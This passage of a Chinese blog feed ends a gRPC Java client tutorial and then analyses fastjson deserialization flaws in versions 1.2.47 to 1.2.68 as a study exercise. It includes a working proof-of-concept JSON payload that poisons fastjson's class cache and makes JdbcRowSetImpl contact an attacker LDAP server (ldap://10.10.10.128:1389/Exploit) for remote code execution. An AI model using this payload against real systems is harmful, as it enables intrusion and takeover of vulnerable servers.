class="comment">/**</span></span><br><span class="line"><span class="comment"> * TinyStatus 客户端</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> lzwgiter</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@email</span> float311@163.com</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 2023/7/4</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TinyStatusClient</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Logger</span> <span class="variable">logger</span> <span class="operator">=</span> Logger.getLogger(TinyStatusServer.class.getName());</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> ServerStatusBlockingStub blockingStub;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">TinyStatusClient</span><span class="params">(ManagedChannel channel)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.blockingStub = ServerStatusGrpc.newBlockingStub(channel);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">target</span> <span class="operator">=</span> args[<span class="number">0</span>];</span><br><span class="line">        <span class="type">String</span> <span class="variable">requestOpt</span> <span class="operator">=</span> args[<span class="number">1</span>];</span><br><span class="line">        <span class="type">ManagedChannel</span> <span class="variable">channel</span> <span class="operator">=</span> Grpc.newChannelBuilder(target, InsecureChannelCredentials.create()).build();</span><br><span class="line">        <span class="type">TinyStatusClient</span> <span class="variable">client</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TinyStatusClient</span>(channel);</span><br><span class="line">        <span class="type">StatusRequest</span> <span class="variable">request</span> <span class="operator">=</span> StatusRequest.newBuilder()</span><br><span class="line">                .setRequestOpt(Integer.parseInt(requestOpt))</span><br><span class="line">                .build();</span><br><span class="line">        <span class="type">StatusResponse</span> <span class="variable">response</span> <span class="operator">=</span> client.blockingStub.queryIndex(request);</span><br><span class="line">        logger.info(response.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>效果如下：</p><p><img src="/img/gRPC简介与使用/image-20230705113146451.png" /></p><h1 id="参考学习">参考学习</h1><ul><li><a href="https://en.wikipedia.org/wiki/Remote_procedure_call">Remoteprocedure call - Wikipedia</a></li><li><a href="https://en.wikipedia.org/wiki/HTTP">HTTP -Wikipedia</a></li><li><ahref="https://martinfowler.com/articles/richardsonMaturityModel.html">RichardsonMaturity Model (martinfowler.com)</a></li><li><a href="https://grpc.io/docs/what-is-grpc/core-concepts/">Coreconcepts, architecture and lifecycle | gRPC</a></li><li><a href="https://grpc.io/docs/languages/java/basics/">Basicstutorial | Java | gRPC</a></li></ul><p><img src="/img/请我喝杯咖啡吧.jpg" style="zoom:33%;" /></p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;gRPC是谷歌设计的一个开源RPC（Remote Process
Call）框架，其基于谷歌开发的&lt;a
href=&quot;https://protobuf.dev/overview/&quot;&gt;Protocol
Buffer&lt;/a&gt;（也支持其他数据结构如JSON、XML等），提供了一种分布式系统内部各个微服务之间互相调用的方法，具有语言无关、平台无关、高效（HTTP/2）、安全（TLS）、可扩展性强的特点，已被广泛应用于诸多公司如：NetFlex、Square、Cisco等。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/img/gRPC简介与使用/image-20230701104730528.png&quot; /&gt;&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="开发技术" scheme="https://lzwgiter.github.io/categories/%E5%BC%80%E5%8F%91%E6%8A%80%E6%9C%AF/"/>
    
    
    <category term="Java" scheme="https://lzwgiter.github.io/tags/Java/"/>
    
    <category term="分布式技术" scheme="https://lzwgiter.github.io/tags/%E5%88%86%E5%B8%83%E5%BC%8F%E6%8A%80%E6%9C%AF/"/>
    
    <category term="微服务技术" scheme="https://lzwgiter.github.io/tags/%E5%BE%AE%E6%9C%8D%E5%8A%A1%E6%8A%80%E6%9C%AF/"/>
    
  </entry>
  
  <entry>
    <title>fastjson反序列化漏洞学习（二）</title>
    <link href="https://lzwgiter.github.io/posts/b74b8800.html"/>
    <id>https://lzwgiter.github.io/posts/b74b8800.html</id>
    <published>2023-04-30T04:01:23.000Z</published>
    <updated>2023-05-03T08:39:29.589Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>紧跟<ahref="https://lzwgiter.github.io/posts/c99165fd.html">上一篇</a>，继续补一下fastjson的审计，复现和分析范围包括1.2.47-1.2.80。</p><p><imgsrc="/img/fastjson反序列化漏洞学习（二）/33f3fdfdbd7163516bd4eb85bbcb34a7.png" /></p></blockquote><span id="more"></span><h1 id="fastjson-1.2.47">FastJson 1.2.47</h1><p>47出现了最严重的一个漏洞，之前我们可以看到，从25-43所有版本，我们都是在开启AutoType的条件下才可以进行的，配合不同的绕过手段。而47版本的漏洞<strong>无需开启AutoType即可对漏洞进行利用</strong>。据说payload的来源是官方的一个测试commit：<ahref="https://github.com/alibaba/fastjson/commit/be41b36a8d748067ba4debf12bf236388e500c66">removeunused testcase · alibaba/fastjson@be41b36 (github.com)</a>：</p><p><imgsrc="/img/fastjson反序列化漏洞学习（二）/image-20230502123623460.png" /></p><p>泄露的payload中通过指定Class，并使用<code>val</code>关键字指定了恶意类。在后续分析可以看到，该操作将恶意类注入到了<strong>缓存(mapping)</strong>中，从而导致了在不开启autoType的情况下可以从缓存中获取到这个恶意类。</p><h2 id="温故">温故</h2><p>回顾一下25&lt;= fastjson&lt;=42版本的漏洞，我们都是通过使用特殊字符如<code>L</code>或<code>[</code>绕过的。而在44版本开始，官方已经把<code>L</code>及双写、<code>[</code>开头的利用方式都过过滤掉了：</p><p><imgsrc="/img/fastjson反序列化漏洞学习（二）/image-20230501185854568.png" /></p><p>看似在开启了<code>autoTypeSupport</code>的情况下没有其他利用方式了，但是仍然是存在问题的。通过上面的代码可以看到，在不使用特殊字符的方式的情况下，恶意类名称肯定是会被第三个黄框里的循环判断发现的，那就没辙了。</p><h2 id="知新">知新</h2><p><strong>那我们如果放弃autoTypeSupport不走这个判断了呢？</strong>这样不就不会进入判断了？47版本的利用方式就是这样的。我们关注一下下面的两条语句：</p><p><imgsrc="/img/fastjson反序列化漏洞学习（二）/image-20230501190303635.png" /></p><p>若没有开启<code>autoTypeSupport</code>，则会从Mapping或者deserializers中寻找，如果这俩之一找到了，会在下面的if判断中直接返回，后面那个黑白名单机制也不会走了。我们分别看一下这两个分支。</p><p><code>TypeUtils.getClassFromMapping</code>的静态方法会判断这个类名称是否存在于TypeUtils维护的一个concurrentHashMap中，并通过<code>addBaseClassMapping</code>方法配合<code>loadClass</code>方法向这个字典中添加常用类：</p><p><img src="/img/fastjson反序列化漏洞学习（二）/image-20230501190920903.png" style="zoom:67%;" /></p><p>下面是简要代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">addBaseClassMappings</span><span class="params">()</span>&#123;</span><br><span class="line">        mappings.put(<span class="string">&quot;byte&quot;</span>, <span class="type">byte</span>.class);</span><br><span class="line">        <span class="comment">// 省略...主要包括八大基本数据类型以及他们带上&quot;[&quot;的样式</span></span><br><span class="line">        mappings.put(<span class="string">&quot;[Z&quot;</span>, <span class="type">boolean</span>[].class);</span><br><span class="line">        Class&lt;?&gt;[] classes = <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;...&#125;;</span><br><span class="line">        <span class="keyword">for</span>(Class clazz : classes)&#123;</span><br><span class="line">            <span class="keyword">if</span>(clazz == <span class="literal">null</span>)&#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            mappings.put(clazz.getName(), clazz);</span><br><span class="line">        &#125;</span><br><span class="line">        String[] awt = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;...&#125;;</span><br><span class="line">        <span class="keyword">for</span>(String className : awt)&#123;</span><br><span class="line">            Class&lt;?&gt; clazz = loadClass(className);<span class="comment">// 调用加载</span></span><br><span class="line">            <span class="keyword">if</span>(clazz == <span class="literal">null</span>)&#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            mappings.put(clazz.getName(), clazz);</span><br><span class="line">        &#125;</span><br><span class="line">        String[] spring = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;...&#125;;</span><br><span class="line">        <span class="keyword">for</span>(String className : spring)&#123;</span><br><span class="line">            Class&lt;?&gt; clazz = loadClass(className);  <span class="comment">// 调用添加</span></span><br><span class="line">            <span class="keyword">if</span>(clazz == <span class="literal">null</span>)&#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            mappings.put(clazz.getName(), clazz);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>看起来都是在添加一些固定的类，我们没有可以插手的地方。那可以利用的就是loadClass函数了，<strong>这里先埋下伏笔</strong>，我们看看另一个if分支。另一个分支的函数的findClass函数如下：</p><p><img src="/img/fastjson反序列化漏洞学习（二）/image-20230501192902439.png" style="zoom:67%;" /></p><p>该函数会从buckets中寻找该类的<strong>父类</strong>，如果可以找到的话则向上转型并返回。这个bucket是一个<code>fastjson.utils.IdentityHashMap</code>类型数据，提供了put方法向其中添加类。能够向这个Map中写入数据的方法包括：</p><p><img src="/img/fastjson反序列化漏洞学习（二）/image-20230501194008345.png" style="zoom:67%;" /></p><p>但是这些函数的参数、添加的内容我们是无法控制的。因此我们就只能想办法利用第一个if分支中的<code>getClassFromMapping</code>了。</p><p>重新回到我提到的<strong>伏笔</strong>--loadClass方法，看看内容：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Class&lt;?&gt; loadClass(String className, ClassLoader classLoader, <span class="type">boolean</span> cache) &#123;</span><br><span class="line">    <span class="keyword">if</span>(className == <span class="literal">null</span> || className.length() == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 先从mappings中判断是否存在</span></span><br><span class="line">    Class&lt;?&gt; clazz = mappings.get(className);</span><br><span class="line">    <span class="keyword">if</span>(clazz != <span class="literal">null</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> clazz;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 判断特殊情况，[和L的办法我们已经不能利用了</span></span><br><span class="line">    <span class="keyword">if</span>(className.charAt(<span class="number">0</span>) == <span class="string">&#x27;[&#x27;</span>)&#123;</span><br><span class="line">        Class&lt;?&gt; componentType = loadClass(className.substring(<span class="number">1</span>), classLoader);</span><br><span class="line">        <span class="keyword">return</span> Array.newInstance(componentType, <span class="number">0</span>).getClass();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(className.startsWith(<span class="string">&quot;L&quot;</span>) &amp;&amp; className.endsWith(<span class="string">&quot;;&quot;</span>))&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">newClassName</span> <span class="operator">=</span> className.substring(<span class="number">1</span>, className.length() - <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> loadClass(newClassName, classLoader);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 注意这里，若不属于上面两个分支的特殊情况的话，就会直接使用classLoader加载</span></span><br><span class="line">    <span class="comment">// 而这里，是没有做黑名单之类的判断的，而是会直接放到mappings中</span></span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(classLoader != <span class="literal">null</span>)&#123;</span><br><span class="line">            clazz = classLoader.loadClass(className);</span><br><span class="line">            <span class="keyword">if</span> (cache) &#123;</span><br><span class="line">                mappings.put(className, clazz);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> clazz;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span>(Throwable e)&#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">        <span class="comment">// skip</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">contextClassLoader</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader();</span><br><span class="line">        <span class="keyword">if</span>(contextClassLoader != <span class="literal">null</span> &amp;&amp; contextClassLoader != classLoader)&#123;</span><br><span class="line">            clazz = contextClassLoader.loadClass(className);</span><br><span class="line">            <span class="keyword">if</span> (cache) &#123;</span><br><span class="line">                mappings.put(className, clazz);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> clazz;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span>(Throwable e)&#123;</span><br><span class="line">        <span class="comment">// skip</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        clazz = Class.forName(className);</span><br><span class="line">        mappings.put(className, clazz);</span><br><span class="line">        <span class="keyword">return</span> clazz;</span><br><span class="line">    &#125; <span class="keyword">catch</span>(Throwable e)&#123;</span><br><span class="line">        <span class="comment">// skip</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> clazz;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里可以看到，我们是有机可图的，即，若一个类：</p><ul><li>不是<code>L</code>开头<code>;</code>结尾的名字、不是<code>[</code>开头的名字</li><li>不是预先加载的常用类</li></ul><p><strong>那么，就会被加载并放入mapping中。</strong>That's all wegot。</p><p>这个方法在类中有三个重载：</p><p><imgsrc="/img/fastjson反序列化漏洞学习（二）/image-20230501195252894.png" /></p><p>其中：</p><ul><li><p>LoadClass(x)：均用于加载一些固定名称的类，没法子利用到。</p><p><imgsrc="/img/fastjson反序列化漏洞学习（二）/image-20230501195841774.png" /></p></li><li><p>LoadClass(x,y)：除了<code>TypeUtils</code>中的自调用以及加载<code>L</code>和<code>[</code>外，<code>MiscCodec</code>中有一个deserialze方法存在调用，<strong>且那个strVal看起来是可以控制的，稍后我们细看一下。</strong></p><p><imgsrc="/img/fastjson反序列化漏洞学习（二）/image-20230501200028791.png" /></p></li><li><p>LoadClass(x, y, z)：调用都在checkAutoType中，没法利用</p><p><imgsrc="/img/fastjson反序列化漏洞学习（二）/image-20230501195732283.png" /></p></li></ul><p>ok，那我们就聚焦于<code>fastjson.serializer.MiscCodec</code>类的<code>deserialize</code>方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line"><span class="keyword">public</span> &lt;T&gt; T <span class="title function_">deserialze</span><span class="params">(DefaultJSONParser parser, Type clazz, Object fieldName)</span> &#123;</span><br><span class="line">    <span class="type">JSONLexer</span> <span class="variable">lexer</span> <span class="operator">=</span> parser.lexer;</span><br><span class="line">    <span class="comment">// 省略无关代码</span></span><br><span class="line"></span><br><span class="line">    Object objVal;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 若parser的resolveStatus符合判断的话，则调用DefaultJSONParser.parse方法获取对象</span></span><br><span class="line">    <span class="keyword">if</span> (parser.resolveStatus == DefaultJSONParser.TypeNameRedirect) &#123;</span><br><span class="line">        <span class="comment">// 省略部分代码</span></span><br><span class="line"></span><br><span class="line">        objVal = parser.parse();</span><br><span class="line"></span><br><span class="line">        parser.accept(JSONToken.RBRACE);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        objVal = parser.parse();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    String strVal;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (objVal == <span class="literal">null</span>) &#123;</span><br><span class="line">        strVal = <span class="literal">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (objVal <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">        strVal = (String) objVal;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (objVal <span class="keyword">instanceof</span> JSONObject) &#123;</span><br><span class="line">            <span class="type">JSONObject</span> <span class="variable">jsonObject</span> <span class="operator">=</span> (JSONObject) objVal;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (clazz == Currency.class) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">currency</span> <span class="operator">=</span> jsonObject.getString(<span class="string">&quot;currency&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span> (currency != <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">return</span> (T) Currency.getInstance(currency);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="type">String</span> <span class="variable">symbol</span> <span class="operator">=</span> jsonObject.getString(<span class="string">&quot;currencyCode&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span> (symbol != <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">return</span> (T) Currency.getInstance(symbol);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (clazz == Map.Entry.class) &#123;</span><br><span class="line">               <span class="keyword">return</span> (T) jsonObject.entrySet().iterator().next();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> jsonObject.toJavaObject(clazz);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;expect string&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (strVal == <span class="literal">null</span> || strVal.length() == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 省略无关判断代码</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 关注点：若这个类是Class类型的，则使用loadClass加载</span></span><br><span class="line">    <span class="keyword">if</span> (clazz == Class.class) &#123;</span><br><span class="line">        <span class="keyword">return</span> (T) TypeUtils.loadClass(strVal, parser.getConfig().getDefaultClassLoader());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 省略无关判断代码</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么思路就有了，我们需要加载一个Class类型的类，并通过strVal来进行控制。先实验一个简单的例子：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONObject;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> lzwgiter</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> 2023/4/26 2023</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 注意，第二个字段必须是val</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">poc</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;java.lang.Class\&quot;, \&quot;val\&quot;: \&quot;aha\&quot;&#125;&quot;</span>;</span><br><span class="line">        <span class="type">JSONObject</span> <span class="variable">pocObj</span> <span class="operator">=</span> JSONObject.parseObject(poc);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因为没有开启autoTypeSupport，也不是黑名单类，因此我们就来到了下面的两个分支：</p><p><imgsrc="/img/fastjson反序列化漏洞学习（二）/image-20230501201612352.png" /></p><p><imgsrc="/img/fastjson反序列化漏洞学习（二）/image-20230501201920530.png" /></p><p>紧接着，我们在findClass方法中，找到了类，这是很自然的，然后在下面的分支中返回class。</p><p><imgsrc="/img/fastjson反序列化漏洞学习（二）/image-20230501202140187.png" /></p><p>紧接着，结束了checkAutoType函数，并将当前parser的状态设置为了<code>TypeNameRedirect</code>，<strong>这就满足了前面<code>MiscCodec</code>代码中的判断条件了。</strong></p><p><imgsrc="/img/fastjson反序列化漏洞学习（二）/image-20230501202405636.png" /></p><p>最后反序列化的工作交给了<code>MiscCodec</code>，那么就会进入我们前面的代码片段了：</p><p><imgsrc="/img/fastjson反序列化漏洞学习（二）/image-20230501203038066.png" /></p><p>可以看到，<code>strVal</code>的值被赋予了我们<code>val</code>字段的值。</p><p><imgsrc="/img/fastjson反序列化漏洞学习（二）/image-20230501203136107.png" /></p><p>由于是Class类型的，因此调用loadClass方法：</p><p><imgsrc="/img/fastjson反序列化漏洞学习（二）/image-20230501203436222.png" /></p><p>并完成加载和<strong>污染</strong>mapping的过程。污染了之后呢？</p><p><imgsrc="/img/fastjson反序列化漏洞学习（二）/image-20230501203557717.png" /></p><p>我们就可以从第一个分支中、从mapping中获取这个类了。</p><p>至此就是整个攻击原理和思路了，小结一下，我们的思路是分两个阶段的，是承上启下的关系。</p><ol type="1"><li>关闭autoTypeSupport以逃过黑名单，并通过<code>Class</code>的类型注入<strong>恶意类</strong>到mapping中。</li><li>二次从mapping中读取以加载恶意类。</li></ol><p>因此Poc如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONObject;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> lzwgiter</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> 2023/4/26</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        &#123;</span></span><br><span class="line"><span class="comment">            injection: &#123;</span></span><br><span class="line"><span class="comment">                @type: java.lang.Class,</span></span><br><span class="line"><span class="comment">                val: com.sun.rowset.JdbcRowSetImpl</span></span><br><span class="line"><span class="comment">            &#125;,</span></span><br><span class="line"><span class="comment">            utilization: &#123;</span></span><br><span class="line"><span class="comment">                @type: com.sun.rowset.JdbcRowSetImpl,</span></span><br><span class="line"><span class="comment">                dataSourceName: &quot;ldap://10.10.10.128:1389/POC&quot;,</span></span><br><span class="line"><span class="comment">                autoCommit: true</span></span><br><span class="line"><span class="comment">            &#125;</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">poc</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;injection\&quot;: &#123;\&quot;@type\&quot;: \&quot;java.lang.Class\&quot;, \&quot;val\&quot;: \&quot;com.sun.rowset.JdbcRowSetImpl\&quot;&#125;, \&quot;utilization\&quot;: &#123;\&quot;@type\&quot;: \&quot;com.sun.rowset.JdbcRowSetImpl\&quot;, \&quot;dataSourceName\&quot;: \&quot;ldap://10.10.10.128:1389/Exploit\&quot;, \&quot;autoCommit\&quot;: true&#125;&#125;&quot;</span>;</span><br><span class="line">        <span class="type">JSONObject</span> <span class="variable">pocObj</span> <span class="operator">=</span> JSONObject.parseObject(poc);</span><br><span class="line">        System.out.println(pocObj);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/img/fastjson反序列化漏洞学习（二）/poc_1.gif" /></p><h1 id="fastjson-1.2.68">FastJson 1.2.68</h1><blockquote><p>安全说明：<ahref="https://github.com/alibaba/fastjson/wiki/security_update_20200601">security_update_20200601· alibaba/fastjson Wiki (github.com)</a></p></blockquote><h2 id="温故-1">温故</h2><p>先尝试一下47的payload：</p><p><imgsrc="/img/fastjson反序列化漏洞学习（二）/image-20230502130316016.png" /></p><p>看一下修改的地方：</p><p><imgsrc="/img/fastjson反序列化漏洞学习（二）/image-20230502131604632.png" /></p><p>嗯？这不是后面那个黑白名单吗？怎么会走到这里来？不应该第二次拿到第一次注入后的就直接返回了吗？跟进看一下第一次的恶意类是否真的投放进去了：</p><p><imgsrc="/img/fastjson反序列化漏洞学习（二）/image-20230502132744275.png" /></p><p>行吧，那可控吗？</p><p><imgsrc="/img/fastjson反序列化漏洞学习（二）/image-20230502133249856.png" /></p><p><imgsrc="/img/fastjson反序列化漏洞学习（二）/image-20230428154041333.png" /></p><h2 id="知新-1">知新</h2><p><imgsrc="/img/fastjson反序列化漏洞学习（二）/image-20230502133652318.png" /></p><p>官方说明中提到新增加了safeMode：</p><p><img src="/img/fastjson反序列化漏洞学习（二）/image-20230502134545963.png" style="zoom:60%;" 